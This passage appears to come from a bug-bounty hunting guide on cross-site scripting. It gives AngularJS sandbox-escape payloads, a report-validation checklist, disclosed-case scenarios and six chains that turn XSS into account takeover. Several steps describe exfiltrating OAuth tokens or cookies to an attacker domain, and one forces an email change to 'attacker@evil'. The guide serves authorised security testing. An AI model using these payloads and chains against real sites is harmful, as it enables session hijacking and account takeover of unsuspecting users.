- *Execute JS by escaping the sandbox* (technique depends on the AngularJS version):
  - Common: `{{constructor.constructor('alert(1)')()}}` or `{{$eval.constructor('alert(1)')()}}`.
  - **Hard variant — `$eval` unavailable AND string literals disallowed:** overwrite `String.prototype.charAt` (this disables the sandbox's per-character string checks), then use the `orderBy` filter with `String.fromCharCode` to build your JS with no quotes at all. Payload structure (fill in the placeholders yourself):
    ```
    ?PARAM=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(CODES)=1
    ```
    - `PARAM` = the reflected parameter you found.
    - `CODES` = the comma-separated character codes of the JavaScript you want to run — **compute these yourself** (e.g. encode `x=alert(1)` by converting each character to its char code). `toString()` produces a string without quotes; `[].join` replaces `charAt`; `orderBy` invokes the filter; `fromCharCode(CODES)` rebuilds your payload from the codes.
- Applies to **legacy AngularJS (<1.6)** only; modern frameworks (Angular 2+, React, Vue) are not affected.

---

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   The attacker must demonstrate a concrete action: execute JavaScript in victim's browser session on the target domain, steal session cookies/tokens, perform actions as the victim, or exfiltrate sensitive data. "Alert box appears" is not sufficient — state what the alert box *represents* in terms of access (e.g., "I can read `document.cookie` which contains the auth token used for all admin API calls").

2. **What does the victim LOSE?**
   The victim must lose something real: session control (account takeover), sensitive data (cookies, CSRF tokens, PII), money (financial action performed without consent), or trust (credential phishing via DOM manipulation). If the victim is an unauthenticated user on a public page with no session, quantify what *that* user's browser is exposed to.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must have a self-contained PoC URL or step sequence that any reviewer can follow without prior setup. The payload must fire in a current browser (Chrome/Firefox latest) without special configuration. If it only works in outdated browsers or requires the victim to have a specific extension installed, it likely won't be accepted.

---

## Real Impact Examples

**Scenario 1 — Stored XSS via Cache Poisoning on Sign-In Page**
An attacker discovered that a major payment platform's sign-in page reflected user-controlled input and was cached by the CDN layer. By sending a crafted request that poisoned the cache, the attacker transformed a reflected XSS into a stored-equivalent that fired for every user visiting the login page. Impact: mass credential harvesting at scale — every user who visited the sign-in page would have their credentials captured. The bypassed CSP made remediation require both code fixes and cache purging.

**Scenario 2 — Stored XSS via Diagram Rendering in Wiki**
A developer platform's wiki feature integrated a third-party diagram rendering service (Kroki). An attacker crafted a malicious diagram payload that, when rendered, executed arbitrary JavaScript in the context of any user viewing the wiki page. Because wikis are shared across team members including project owners and admins, the payload could silently exfiltrate OAuth tokens and perform administrative actions on behalf of every viewer — effectively achieving organization-level account takeover from a single stored payload.

**Scenario 3 — Sanitizer Bypass via Label Color Field with CSP Bypass**
A project management platform patched an XSS vulnerability in label color fields but the fix was incomplete. A researcher found that by combining the `style` tag allowlist with specific tag nesting (`svg>style`), the sanitizer's output mutated when parsed by the browser, executing injected JavaScript. The payload also bypassed the platform's Content Security Policy because the injection occurred in an allowlisted inline style context. Impact: any user with label-creation permissions (often all project members) could inject persistent XSS that triggered for every project visitor, enabling cross-user session theft within the same project namespace.

---

## Chains & Compositions (Senior Hunting)

XSS as a standalone finding gets paid at Low-Medium on mature programs. Real payouts cluster around chains that convert JS execution into account takeover, mass-victim impact, CSP bypass, or token exfil. The composition skill is *"what does my XSS unlock once it executes?"* — and the answer is always something beyond `alert(1)`.

### Chain 1 — Reflected XSS + Cache Poisoning → Persistent Stored XSS at CDN Scale (Kettle-class)

- **A.** Identify a reflected XSS where the vulnerable input lands in the response body and the response is cacheable (`Cache-Control: public, max-age=…`).
- **B.** Identify an unkeyed input that influences the cached body — typically `X-Forwarded-Host`, `X-Original-URL`, an unkeyed cookie, or a parameter stripped from the cache key but reflected in the body.
- **C.** Send a single request with the XSS payload via the unkeyed input. Cache stores the poisoned response. Every subsequent CDN-edge visitor receives it for the full TTL.
- **Impact:** Self-inflicted reflected XSS becomes persistent stored XSS affecting every visitor in the affected geo until cache expires. No per-victim interaction required.
- **Real shape:** Glassdoor reflected→stored XSS via cache poisoning, H1 #1424094 (2021-2022); Kettle "Practical Web Cache Poisoning" research. Cross-refs `hunt-cache-poison` Disclosed Report Citation #4.

### Chain 2 — Self-XSS + CSRF Trigger → Effective Stored XSS → ATO

- **A.** Confirm self-XSS in a profile field (`bio`, `display_name`, `signature`) — payload only executes when the same logged-in user views their own profile.
- **B.** Find a CSRF-vulnerable endpoint that mutates that field (no anti-CSRF token, or `text/plain` enctype bypass).
- **C.** Craft attacker-hosted page that submits the CSRF form setting `bio` to the XSS payload. Victim visits attacker page → CSRF fires → victim's profile updated → victim's next visit to their own profile executes attacker JS.
- **Impact:** Self-XSS that "doesn't pay" becomes ATO. The payload runs in the victim's authenticated session — extract cookie, force email change via XHR, password reset → full ATO.
- **Real shape:** Multiple H1 disclosures 2019-2023 across social platforms. Cross-refs `hunt-csrf` step 7 (form-based CSRF on profile mutation).

### Chain 3 — DOM XSS on /signin or /oauth Callback → Fragment Token Capture → ATO

- **A.** Find DOM XSS on a `/signin`, `/oauth/callback`, or `/auth/return` page — typically `document.location.hash` parsed into the DOM without escaping.
- **B.** OAuth-implicit-flow callbacks frequently land tokens in the URL fragment (`#access_token=...`). The fragment is NOT sent to the server; only the browser sees it.
- **C.** XSS payload reads `document.location.hash`, base64-encodes it, exfils via `Image()` to attacker domain. Attacker now holds the OAuth access token.
- **Impact:** Cross-platform ATO. The access token typically grants API scope to Facebook/Google/Microsoft user data; some implementations use the token directly as the session.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor OAuth token leakage (F. Rosén, 2022); Zoom OAuth chained ATO $15,000 (H1 / Harel Security, 2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19 and #20.

### Chain 4 — SVG Upload XSS + CSP Bypass → JS Execution on Trusted Origin → Cookie/Token Theft

- **A.** Identify a file-upload feature that accepts `image/svg+xml`. SVG files are XML and can contain `<script>` tags — many sanitisers process PNG/JPG but pass SVG through unmodified.
- **B.** CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses. The SVG executes JS in the context of whichever origin serves it.
- **C.** If the SVG is served same-origin (common when uploads go to `target.com/uploads/<sha>.svg`), the executing JS has full session-cookie access and can call any same-origin API.
- **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector — bypasses CSP entirely; pulls session cookies, calls password-change endpoints, ATO.
- **Real shape:** Multiple disclosed cases across SaaS uploaders; cross-refs `hunt-file-upload` SVG section and `hunt-xxe` Disclosed Report Citation #3 and #4 (Zivver/Lab45 SVG-upload chains).

### Chain 5 — postMessage XSS + Origin Check Bypass → Cross-Origin Token Exfil → ATO

- **A.** Identify a `window.addEventListener('message', handler)` where `handler` does NOT check `event.origin` (or checks it with a `indexOf`/`endsWith` that fails on `target.com.attacker.com`).
- **B.** Attacker page opens `target.com` in a popup or iframe. Once loaded, sends a `postMessage` payload that the handler evals, processes as XSS, or uses to extract `document.cookie`.
- **C.** Handler executes in `target.com` context; response is `postMessage`'d back to attacker page via `event.source.postMessage(stolenData, '*')`.
- **Impact:** Cross-origin JS execution and exfil with no CSP violation — `postMessage` is a legitimate cross-origin channel; CSP doesn't gate it. Token theft / session hijack.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor postMessage gadgets (2022); Zoom OAuth + postMessage chain (2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19, #20.

### Chain 6 — Markdown/Wiki XSS + Privileged Viewer → Cross-Privilege Stored XSS

- **A.** Stored XSS in a collaborative content field (wiki page, issue comment, customer ticket, support reply) — payload survives Markdown rendering due to insufficient allowlist on `<style>`, `<math>`, `<svg>`, or attribute filters.
- **B.** The collaborative content is viewed by a privileged user (admin, support agent with elevated permissions, project maintainer).
- **C.** Privileged viewer's session executes the payload in their authenticated context — XHR to admin-only endpoints, role-change of attacker, secret exfil from admin-only panels.
- **Impact:** Privilege escalation from low-priv user to admin via stored XSS — attacker promotes themselves on the privileged user's behalf.
- **Real shape:** GitLab/Jira/Confluence markdown-XSS-to-admin-priv-esc class; common payout pattern is High (privilege escalation severity bump over standalone stored XSS).

### Operator-level pattern

When you confirm XSS at A, immediately ask: what state-changing endpoint or token store does this JS now have access to? *Where does the payload run, and who sees it?* The chain payout is 5-20x the standalone XSS payout. Discipline gate before submission: do not file XSS as "Critical" without demonstrating the terminal impact (ATO / token exfil / privilege escalation); file as Medium otherwise.

Cross-references:
- `hunt-cache-poison` — Chain 1
- `hunt-csrf` — Chain 2
- `hunt-oauth` — Chains 3, 5
- `hunt-file-upload` / `hunt-xxe` — Chain 4
- `hunt-ato` — terminal impact for Chains 2, 3, 4, 5

---

## Related Skills & Chains

- **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com → every CDN-edge visitor executes attacker JS without any per-victim interaction.
- **`hunt-csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio → fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin → silent email takeover → password reset → full ATO without the victim ever leaving the page.
- **`hunt-http-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
- **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads; also the always-rejected list to confirm self-XSS / alert-only PoCs are not submittable.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded (`&lt;`) in the response body — those are the two most common downgrade-to-N/A traps.